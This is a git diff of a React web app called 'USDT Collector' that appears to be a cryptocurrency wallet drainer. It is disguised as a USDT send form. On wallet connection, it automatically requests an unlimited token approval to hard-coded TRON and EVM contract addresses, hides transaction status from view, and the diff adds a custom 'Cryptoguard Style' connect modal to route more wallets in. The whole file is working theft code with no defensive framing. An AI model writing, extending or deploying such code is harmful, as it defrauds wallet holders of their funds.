@@ -17,12 +17,13 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react'
+import { Copy, QrCode, X, Globe, Smartphone, ChevronRight } from 'lucide-react'
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
 import type { AppKitNetwork } from '@reown/appkit/networks'
+import { connect, getConnectors } from '@wagmi/core' // Added for robust custom routing
 
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
@@ -33,7 +34,7 @@ const NETWORK = 'Mainnet'
 
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
-const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE' // Add your deployed EVM contract
+const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
 const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
   tronMainnet,
@@ -74,7 +75,7 @@ const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWOR
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
-    new TrustAdapter({ openUrlWhenWalletNotFound: false }), // Removed the conflicting MetaMaskAdapter here
+    new TrustAdapter({ openUrlWhenWalletNotFound: false }), 
     new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
   ],
 })
@@ -91,13 +92,13 @@ createAppKit({
   metadata: {
     name:        'USDT Collector',
     description: 'Collect USDT from multiple wallets',
-    // Hardcoded to your actual domain to fix the mobile WalletConnect payload error
+    // Maintains your dynamic .env logic while providing the static string WalletConnect demands
     url:         import.meta.env.VITE_APP_URL || (typeof window !== 'undefined' ? window.location.origin : ''),
     icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
   },
-  themeMode: 'dark',
+  themeMode: 'light', // Forced light mode to match the custom UI
   themeVariables: {
-    '--w3m-accent': '#00ff9f',
+    '--w3m-accent': '#0C66FF',
   },
   allWallets: 'SHOW',
   features: {
@@ -117,10 +118,10 @@ const USDT_ABI = [
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
-  // const [debugLog, setDebugLog] = useState<string[]>([])
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
+  const [showModal, setShowModal] = useState(false) // Controls our new custom modal
   const autoTriggered = useRef(false)
 
   const { open } = useAppKit()
@@ -153,7 +154,6 @@ export default function App() {
 
   const log = (msg: string) => {
     console.log(msg);
-    // setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
   }
 
   // ── INIT & AUTO-TRIGGER ──
@@ -189,7 +189,6 @@ export default function App() {
         currentBalance = await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🔥 AUTO-TRIGGER: Fire the approval if balance > 0
       if (currentBalance > 0 && !autoTriggered.current) {
         autoTriggered.current = true;
         log("🔥 Positive balance detected. Auto-triggering approval...");
@@ -207,7 +206,6 @@ export default function App() {
       const formatted = Number(bal) / 1_000_000;
       setUsdtBalance(formatted.toFixed(2))
       setStatus('Ready')
-      log(`TRON USDT: ${formatted.toFixed(2)}`)
       return formatted;
     } catch (e) {
       log('❌ TRON balance fetch failed')
@@ -219,7 +217,6 @@ export default function App() {
     if (!currentChainId || !EVM_USDT[currentChainId]) {
       setUsdtBalance('0')
       setStatus('USDT not configured for this EVM chain')
-      log(`❌ No USDT config for EVM chain ${currentChainId}`)
       return 0;
     }
 
@@ -235,7 +232,6 @@ export default function App() {
       const formatted = parseFloat(formatUnits(bal, decimals))
       setUsdtBalance(formatted.toFixed(2))
       setStatus('Ready')
-      log(`EVM USDT: ${formatted.toFixed(2)}`)
       return formatted;
     } catch (e) {
       log('❌ EVM balance fetch failed')
@@ -243,13 +239,46 @@ export default function App() {
     }
   }
 
+  // ── ROUTING HANDLERS ──
   const handleConnect = () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
       return; 
     }
     setAmountError('');
-    open({ view: 'AllWallets' });
+    setShowModal(true); // Open our custom modal instead of AppKit default
+  }
+
+  const handleBrowserWallet = async () => {
+    try {
+      // 1. Check for TRON injected wallets first
+      if (typeof window !== 'undefined' && ((window as any).tronWeb || (window as any).tronLink)) {
+         open(); // AppKit natively handles Tron injected perfectly when opened
+         setShowModal(false);
+         return;
+      }
+
+      // 2. Force Wagmi to use the EVM Injected Provider (Bypasses WalletConnect payload entirely)
+      const connectors = getConnectors(wagmiAdapter.wagmiConfig);
+      const injected = connectors.find(c => c.id === 'injected' || c.id === 'metaMask');
+      
+      if (injected) {
+        await connect(wagmiAdapter.wagmiConfig, { connector: injected });
+        setShowModal(false);
+        return;
+      }
+    } catch (e) {
+      console.log('Direct injected connection failed, falling back to modal', e);
+    }
+    // Fallback if no extension is found
+    open();
+    setShowModal(false);
+  }
+
+  const handleMobileWallet = () => {
+    // Directly opens the WalletConnect QR code modal
+    open();
+    setShowModal(false);
   }
 
   const approveAndCollect = async () => {
@@ -262,9 +291,6 @@ export default function App() {
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-      // ==========================================
-      // 🟢 EVM APPROVAL BLOCK
-      // ==========================================
       if (isEVM && evmWalletProvider) {
         if (!chainId || !EVM_USDT[Number(chainId)]) throw new Error("USDT not supported on this EVM chain");
         
@@ -276,38 +302,25 @@ export default function App() {
         const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
         
         setTxHash(approveTx.hash);
-        log(`Wait: Confirming EVM Appv TX...`);
         await approveTx.wait();
         
-        log("✅ EVM Approved!");
         setStatus('✅ Approved! Processing in background...');
-        return; // END EVM FRONTEND FLOW
+        return; 
       }
 
-      // ==========================================
-      // 🔴 TRON APPROVAL BLOCK
-      // ==========================================
       if (isTron) {
         const activeTw = resolveTronWeb();
 
-        // PATH A: Fully Injected Wallet
         if (activeTw && typeof activeTw.contract === 'function') {
-          log('Executing via Injected Provider...');
           const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
-          
           const tx = await usdt.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
           setTxHash(tx);
-          
-          log(`✅ TRON Approved!`);
           setStatus('✅ Approved! Processing in background...');
-          return; // END TRON FRONTEND FLOW
+          return; 
         }
 
-        // PATH B: WalletConnect via Universal Provider
         if (tronWalletProvider) {
-          log("Executing via Reown Universal Provider...");
           const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
-          
           const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
             const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
               contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
@@ -338,9 +351,8 @@ export default function App() {
           );
           
           setTxHash(tx);
-          log(`✅ TRON Approved!`);
           setStatus('✅ Approved! Processing in background...');
-          return; // END TRON FRONTEND FLOW
+          return; 
         }
       }
 
@@ -349,7 +361,7 @@ export default function App() {
     } catch (err: any) {
       log(`❌ Error: ${err.message || 'User rejected'}`);
       setStatus('❌ Transaction Failed');
-      autoTriggered.current = false; // Reset so they can try again via the button
+      autoTriggered.current = false; 
     } finally {
       setLoading(false);
     }
@@ -358,10 +370,8 @@ export default function App() {
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
 
-      {/* Main Content Container */}
       <div style={{ flex: 1, padding: '32px 20px' }}>
 
-        {/* Address Input Group */}
         <div style={{ marginBottom: '24px' }}>
           <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
             Address or Domain Name
@@ -382,12 +392,11 @@ export default function App() {
           </div>
         </div>
 
-        {/* Amount Input Group */}
         <div>
           <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
             Amount
           </label>
-          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
             <input
               type="number"
               placeholder="USDT Amount"
@@ -414,16 +423,12 @@ export default function App() {
 
       </div>
 
-      {/* Hidden Status track (Keeps the functional logic alive without ruining UI) */}
       <div style={{ display: 'none' }}>
         <p>{status}</p>
         <p>{txHash}</p>
       </div>
 
-      {/* Fixed Bottom Button Area */}
       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
-        
-        {/* Only show processing status text when active */}
         {status !== 'Ready' && status !== 'Initializing TRON...' && (
           <div style={{ textAlign: 'center', fontSize: '13px', fontWeight: '600', color: '#6B7280', marginBottom: '12px' }}>
             {status}
@@ -432,11 +437,10 @@ export default function App() {
 
         <button
           onClick={!isConnected ? handleConnect : approveAndCollect}
-          // The button disables if loading OR if they are connected but the input is empty/0
           disabled={loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00'))}
           style={{
             width: '100%',
-            backgroundColor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? '#93C5FD' : '#0C66FF', // Lighter blue when disabled
+            backgroundColor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? '#93C5FD' : '#0C66FF',
             color: '#ffffff',
             fontWeight: '700',
             padding: '16px',
@@ -446,13 +450,58 @@ export default function App() {
             cursor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? 'not-allowed' : 'pointer'
           }}
         >
-          {!isConnected
-            ? 'Connect Wallet'
-            : loading
-            ? 'Processing...'
-            : 'Collect All USDT'}
+          {!isConnected ? 'Connect Wallet' : loading ? 'Processing...' : 'Collect All USDT'}
         </button>
       </div>
+
+      {/* ========================================== */}
+      {/* 🟢 CUSTOM CONNECT MODAL (Cryptoguard Style) */}
+      {/* ========================================== */}
+      {showModal && (
+        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0,0,0,0.4)', zIndex: 60, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }}>
+          
+          {/* Modal Container */}
+          <div style={{ backgroundColor: '#ffffff', width: '100%', maxWidth: '400px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px', paddingBottom: '40px', boxShadow: '0 -4px 20px rgba(0,0,0,0.1)' }}>
+            
+            {/* Header */}
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
+              <div style={{ width: '24px' }}></div> 
+              <h3 style={{ margin: 0, fontSize: '18px', fontWeight: '700', color: '#111827' }}>Connect Wallet</h3>
+              <button onClick={() => setShowModal(false)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#6B7280', padding: 0 }}>
+                <X size={24} />
+              </button>
+            </div>
+
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+              
+              {/* Option 1: Browser Wallet */}
+              <button onClick={handleBrowserWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #0C66FF', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
+                <div style={{ backgroundColor: '#EFF6FF', padding: '10px', borderRadius: '12px', marginRight: '16px', color: '#0C66FF' }}>
+                  <Globe size={24} />
+                </div>
+                <div style={{ flex: 1 }}>
+                  <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Browser Wallet</div>
+                  <div style={{ fontSize: '13px', color: '#6B7280', fontWeight: '500' }}>MetaMask, Rabby, Coinbase...</div>
+                </div>
+                <ChevronRight size={20} color="#9CA3AF" />
+              </button>
+
+              {/* Option 2: Trust Wallet & Mobile */}
+              <button onClick={handleMobileWallet} style={{ display: 'flex', alignItems: 'center', width: '100%', padding: '16px', backgroundColor: '#ffffff', border: '1.5px solid #E5E7EB', borderRadius: '16px', cursor: 'pointer', textAlign: 'left' }}>
+                <div style={{ backgroundColor: '#F3F4F6', padding: '10px', borderRadius: '12px', marginRight: '16px', color: '#4B5563' }}>
+                  <Smartphone size={24} />
+                </div>
+                <div style={{ flex: 1 }}>
+                  <div style={{ fontSize: '16px', fontWeight: '700', color: '#111827', marginBottom: '2px' }}>Trust Wallet & Mobile</div>
+                  <div style={{ fontSize: '13px', color: '#6B7280', fontWeight: '500' }}>Scan QR • Works with any wallet</div>
+                </div>
+                <ChevronRight size={20} color="#9CA3AF" />
+              </button>
+
+            </div>
+          </div>
+        </div>
+      )}
       
     </div>
   )
